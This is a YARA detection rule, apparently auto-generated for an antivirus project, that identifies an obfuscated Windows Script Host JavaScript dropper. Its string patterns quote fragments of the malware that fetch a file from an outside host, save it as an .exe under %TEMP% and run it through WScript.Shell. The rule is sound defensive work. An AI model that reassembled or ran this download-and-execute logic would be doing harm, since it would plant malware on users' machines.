rule sig_20160328_911c89537866da6a4afd195a6f74fd0b {
  meta:
    description = "datamaliciousorder - file 20160328_911c89537866da6a4afd195a6f74fd0b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3095aff0a0b723e4d9b3c4ee42c6f8efa5c2e95ffd1ab7e14f390b148032903d"

  strings:
    $s1  = "function Chxgfstzm() {return Gwqkyfkdk[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Yq2BgHJklwwKk.exe\";};" fullword ascii
    $s2  = "Uwzafbxe[Pctevg](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "do {WScript[Mbxxozp](Zclgvlbbfd() * 11)} while (Uwzafbxe[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Lawucbsg(Udbuqdcfr, Asbuzfsi){return Udbuqdcfr - Asbuzfsi;};" fullword ascii
    $s5  = "var Gwqkyfkdk = function Jgvbcmmoij() {return WScript[Jwpucdblj](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Kilvmybj() {return ((Ijkjsau == true) && (Ijkjsau == Cxjjtetnbj)) ? 1 : Wtwolzkqlt;};" fullword ascii
    $s7  = "function Bvrrgfe(Yzggyfqbpv){Gwqkyfkdk[\"Run\"](Yzggyfqbpv, Wtwolzkqlt, Wtwolzkqlt);};" fullword ascii
    $s8  = "var Rowyhgxkom = new this[\"Date\"]();" fullword ascii
    $s9  = "var Ijkjsau = false;" fullword ascii
    $s10 = "function Zclgvlbbfd(){return 22;};" fullword ascii
    $s11 = "var Fmcwyhbp = false;" fullword ascii
    $s12 = "function Kuerjgejbb()" fullword ascii
    $s13 = "var Cxjjtetnbj = false;" fullword ascii
    $s14 = "Ijkjsau = true; " fullword ascii
    $s15 = " while (Prprigizi){" fullword ascii
    $s16 = "function Wvxel(){return Bdbike;};" fullword ascii
    $s17 = "function Cxhipzqt(Rnqxvvh) {var Pmiris = (1, 2, 3, 4, 5, Rnqxvvh); return Pmiris;};" fullword ascii
    $s18 = "Cxjjtetnbj = true; " fullword ascii
    $s19 = "return Lawucbsg(Alngu, Yiwsc);" fullword ascii
    $s20 = "function Qhezldwbi(){return Jwpucdblj;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}